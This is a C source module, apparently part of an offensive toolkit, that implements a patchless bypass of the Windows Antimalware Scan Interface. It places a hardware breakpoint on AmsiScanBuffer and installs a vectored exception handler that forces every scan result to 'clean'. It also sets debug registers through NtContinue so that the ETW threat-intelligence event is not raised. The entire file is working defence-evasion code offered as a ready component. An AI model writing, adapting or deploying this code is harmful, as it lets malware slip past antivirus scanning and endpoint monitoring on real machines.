// chunk: evasion/amsi_hwbp
// depends: (none)
// provides: amsi_hwbp_init, amsi_hwbp_cleanup
// headers: windows.h
// note: Patchless AMSI bypass — hardware breakpoint on AmsiScanBuffer + VEH. No memory modification in amsi.dll. Uses DR1 (DR0 may be used by hw_bp_etw). NtContinue sets debug regs to avoid ETW-TI event from SetThreadContext.

#ifndef CHUNK_AMSI_HWBP
#define CHUNK_AMSI_HWBP

typedef NTSTATUS (NTAPI *pfnNtContinue_amsi)(PCONTEXT ctx, BOOLEAN alert);

static PVOID g_amsi_veh = NULL;
static void *g_amsi_scan_addr = NULL;

static LONG CALLBACK amsi_hwbp_handler(EXCEPTION_POINTERS *ex) {
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if ((void *)ex->ContextRecord->Rip == g_amsi_scan_addr) {
            // AmsiScanBuffer 5th param (AMSI_RESULT*) is at [RSP+0x28]
            DWORD *pResult = *(DWORD **)(ex->ContextRecord->Rsp + 0x28);
            if (pResult)
                *pResult = 0; // AMSI_RESULT_CLEAN

            // Skip the function: return S_OK
            ex->ContextRecord->Rip = *(DWORD64 *)ex->ContextRecord->Rsp;
            ex->ContextRecord->Rsp += 8;
            ex->ContextRecord->Rax = 0; // S_OK
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static volatile int g_amsi_hwbp_set = 0;

static int amsi_hwbp_init(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return 1; // AMSI not loaded = nothing to bypass

    g_amsi_scan_addr = (void *)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!g_amsi_scan_addr) return 1;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtContinue_amsi pNtContinue = (pfnNtContinue_amsi)
        GetProcAddress(ntdll, "NtContinue");
    if (!pNtContinue) return 0;

    g_amsi_veh = AddVectoredExceptionHandler(1, amsi_hwbp_handler);
    if (!g_amsi_veh) return 0;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_FULL;
    RtlCaptureContext(&ctx);

    if (g_amsi_hwbp_set) return 1;
    g_amsi_hwbp_set = 1;

    // Use DR1 (DR0 may be used by hw_bp_etw for EtwEventWrite)
    ctx.Dr1 = (DWORD64)g_amsi_scan_addr;
    ctx.Dr7 = (ctx.Dr7 & ~(0xFu << 4)) | (0x1u << 2); // local enable DR1, execute bp

    pNtContinue(&ctx, FALSE);
    return 1;
}

static void amsi_hwbp_cleanup(void) {
    if (g_amsi_veh) {
        RemoveVectoredExceptionHandler(g_amsi_veh);
        g_amsi_veh = NULL;
    }
}

#endif
